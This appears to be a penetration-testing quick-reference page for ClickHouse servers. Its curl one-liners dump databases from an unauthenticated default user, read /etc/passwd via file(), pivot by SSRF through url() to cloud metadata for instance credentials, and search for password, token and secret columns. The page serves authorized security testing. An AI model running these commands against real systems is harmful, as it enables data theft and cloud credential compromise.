---
service: clickhouse
title: ClickHouse
ports: 8123, 9000, 9440, 9009
aliases: clickhouse-http, clickhouse-native
---

# ClickHouse — quick wins

**When you see it:** 8123/tcp open (HTTP) and `/?query=SHOW+DATABASES` returns data with no
password → the `default` user has no password set. That gives full read across all databases
plus `file()`/`url()` table functions for local file read and SSRF.

> Authorized testing only. Triage is read-only (SELECT/SHOW). Steps marked ✏️ reach beyond
> the database (SSRF, local file read) — get sign-off before using `url()`/`file()`.

## Triage (read-only)
```sh
curl -s "http://H:8123/ping"                                  # "Ok." liveness
curl -s "http://H:8123/?query=SELECT+version()"               # server version
curl -s "http://H:8123/?query=SHOW+DATABASES"                 # unauth = CRITICAL
curl -s "http://H:8123/?query=SELECT+name+FROM+system.users"  # account list
```

## Quick wins

### Dump schema and data (unauth default user)
```sh
curl -s "http://H:8123/?query=SELECT+*+FROM+system.tables+FORMAT+JSON"
curl -s "http://H:8123/?query=SELECT+*+FROM+DB.TABLE+LIMIT+100+FORMAT+CSV"
```
*Why:* an empty-password `default` user reads every table; `system.*` reveals schema, users,
grants, and settings before you touch application data.

### Local file read via file() ✏️
```sh
curl -s "http://H:8123/?query=SELECT+*+FROM+file('/etc/passwd','LineAsString','line String')"
```
*Why:* the `file()` table function reads server-side files within `user_files_path` (and
sometimes beyond on misconfigured installs) — arbitrary file read as the ClickHouse user.

### SSRF via url() → cloud metadata ✏️
```sh
curl -s "http://H:8123/?query=SELECT+*+FROM+url('http://169.254.169.254/latest/meta-data/','LineAsString')"
```
*Why:* `url()` makes the server issue outbound HTTP — pivot to internal services and the
cloud IMDS (AWS 169.254.169.254 / GCP metadata) to steal instance credentials.

### Credential / secret hunting across tables
```sh
curl -s "http://H:8123/?query=SELECT+name+FROM+system.columns+WHERE+name+ILIKE+'%pass%'+OR+name+ILIKE+'%token%'+OR+name+ILIKE+'%secret%'"
```
*Why:* points you at the exact columns worth `SELECT`-ing rather than dumping everything —
faster on wide analytics tables.

## aranum helpers
- `aranumtoolkit/network/enum-clickhouse.sh` — dispatcher (`/ping`, `version()`, unauth `SHOW DATABASES`, `system.users`).

## Gotchas
- Native protocol (9000, 9440 TLS) needs `clickhouse-client --host H` — the HTTP interface (8123) is easier for quick wins.
- Non-default users may have passwords even when `default` does not — enumerate `system.users` and try each.
- `readonly` profile users can still `SELECT` (and often `url()`), so read-only ≠ safe from SSRF/file-read.
- `SHOW DATABASES` returning `system` + `default` only usually means no app data yet — check `system.tables` for real datasets.

## Sources
- HackTricks `pentesting-clickhouse`; ClickHouse docs (table functions `file`/`url`, `system` tables);
  aranum `enum-clickhouse.sh` header notes.
